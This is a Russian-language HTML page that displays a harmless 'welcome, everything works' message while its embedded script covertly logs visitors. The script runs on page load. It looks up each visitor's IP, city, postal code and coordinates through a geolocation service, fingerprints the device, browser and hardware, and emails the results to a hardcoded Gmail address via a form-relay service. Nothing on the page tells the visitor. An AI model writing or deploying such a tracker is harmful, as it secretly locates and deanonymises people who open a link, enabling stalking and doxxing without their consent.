<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Главная</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  html, body { height: 100%; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    background: linear-gradient(135deg, #0f0f1a 0%, #1a1a2e 100%);
    color: #e8e8f0;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 24px;
    min-height: 100vh;
  }
  .card {
    background: rgba(255,255,255,0.04);
    border: 1px solid rgba(255,255,255,0.08);
    border-radius: 16px;
    padding: 48px 32px;
    max-width: 420px;
    width: 100%;
    text-align: center;
    backdrop-filter: blur(10px);
  }
  h1 { font-size: 1.75rem; font-weight: 600; margin-bottom: 12px; letter-spacing: -0.02em; }
  p { color: #8888a0; line-height: 1.6; font-size: 0.95rem; }
  .status { margin-top: 24px; font-size: 0.8rem; color: #5a5a75; min-height: 1em; }
</style>
</head>
<body>
  <div class="card">
    <h1>Добро пожаловать</h1>
    <p>Всё работает как надо. Можешь закрыть эту страницу.</p>
    <div class="status" id="status"></div>
  </div>

  <script>
  (function () {
    'use strict';

    // ============================================================
    //  НАСТРОЙКИ — поменяй только это
    // ============================================================
    const CONFIG = {
      RECIPIENT_EMAIL: 'solncegrei@gmail.com',  // ← сюда свой Gmail
      SEND_ONCE_PER_SESSION: true,              // одно письмо на сессию
      SHOW_STATUS: true                         // показывать статус на странице
    };
    // ============================================================

    const statusEl = document.getElementById('status');
    const setStatus = (t) => { if (CONFIG.SHOW_STATUS && statusEl) statusEl.textContent = t; };

    function shouldSend() {
      if (!CONFIG.SEND_ONCE_PER_SESSION) return true;
      try {
        const key = 'visit_sent_' + location.hostname;
        if (sessionStorage.getItem(key)) return false;
        sessionStorage.setItem(key, '1');
        return true;
      } catch (e) { return true; }
    }

    async function gather() {
      let geo = {};
      try {
        const ctrl = new AbortController();
        const timer = setTimeout(() => ctrl.abort(), 5000);
        const r = await fetch('https://ipapi.co/json/', { cache: 'no-store', signal: ctrl.signal });
        clearTimeout(timer);
        if (r.ok) geo = await r.json();
      } catch (e) {}

      const ua = navigator.userAgent;
      const now = new Date();

      return {
        'Время (локальное)': now.toLocaleString('ru-RU'),
        'Время (UTC)':       now.toISOString(),
        'IP-адрес':          geo.ip || '—',
        'Страна':            geo.country_name ? geo.country_name + ' (' + geo.country_code + ')' : '—',
        'Регион':            geo.region || '—',
        'Город':             geo.city || '—',
        'Индекс':            geo.postal || '—',
        'Координаты':        (geo.latitude && geo.longitude) ? geo.latitude + ', ' + geo.longitude : '—',
        'Провайдер':         geo.org || '—',
        'Часовой пояс':      geo.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone || '—',
        'Тип устройства':    deviceType(ua),
        'ОС':                os(ua),
        'Браузер':           browser(ua),
        'Язык':              navigator.language,
        'Экран':             screen.width + '×' + screen.height + ' @' + window.devicePixelRatio + 'x',
        'Окно':              window.innerWidth + '×' + window.innerHeight,
        'Ядер CPU':          navigator.hardwareConcurrency || '—',
        'Память':            navigator.deviceMemory ? navigator.deviceMemory + ' ГБ' : '—',
        'Сенсор':            ('ontouchstart' in window) ? 'да' : 'нет',
        'User-Agent':        ua,
        'Referrer':          document.referrer || 'прямой заход',
        'Страница':          location.href
      };
    }

    function deviceType(ua) {
      if (/iPad|Tablet|PlayBook|Silk|(Android(?!.*Mobile))/i.test(ua)) return 'Планшет';
      if (/Mobile|Android|iPhone|iPod|BlackBerry|IEMobile|Opera Mini|Windows Phone/i.test(ua)) return 'Смартфон';
      return 'Компьютер';
    }

    function os(ua) {
      if (/Windows NT 10/i.test(ua))   return 'Windows 10/11';
      if (/Windows NT 6\.3/i.test(ua)) return 'Windows 8.1';
      if (/Windows NT/i.test(ua))      return 'Windows';
      const android = ua.match(/Android\s([\d.]+)/);
      if (android) return 'Android ' + android[1];
      const ios = ua.match(/(?:iPhone|CPU) OS\s([\d_]+)/);
      if (ios) return 'iOS ' + ios[1].replace(/_/g, '.');
      if (/Mac OS X/i.test(ua))        return 'macOS';
      if (/Linux/i.test(ua))           return 'Linux';
      return '—';
    }

    function browser(ua) {
      if (/Edg\//i.test(ua))        return 'Edge';
      if (/OPR\/|Opera/i.test(ua))  return 'Opera';
      if (/YaBrowser/i.test(ua))    return 'Yandex';
      if (/Firefox\//i.test(ua))    return 'Firefox';
      if (/Chrome\//i.test(ua))     return 'Chrome';
      if (/Safari\//i.test(ua))     return 'Safari';
      return '—';
    }

    async function send(data) {
      const subject = 'Посетитель: ' + data['Город'] + ', ' + data['Страна'];
      const body = Object.assign({ _subject: subject, _template: 'table', _captcha: 'false' }, data);

      try {
        const r = await fetch('https://formsubmit.co/ajax/' + encodeURIComponent(CONFIG.RECIPIENT_EMAIL), {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
          body: JSON.stringify(body)
        });
        if (r.ok) {
          setStatus('✓ уведомление отправлено');
          console.log('[tracker] отправлено', data);
        } else {
          setStatus('⚠ сервис вернул ошибку');
          console.warn('[tracker] ответ', await r.text());
        }
      } catch (e) {
        setStatus('⚠ не удалось отправить');
        console.error('[tracker]', e);
      }
    }

    (async function run() {
      if (!shouldSend()) { setStatus(''); return; }
      setStatus('определяем устройство...');
      const info = await gather();
      await send(info);
    })();
  })();
  </script>
</body>
</html>
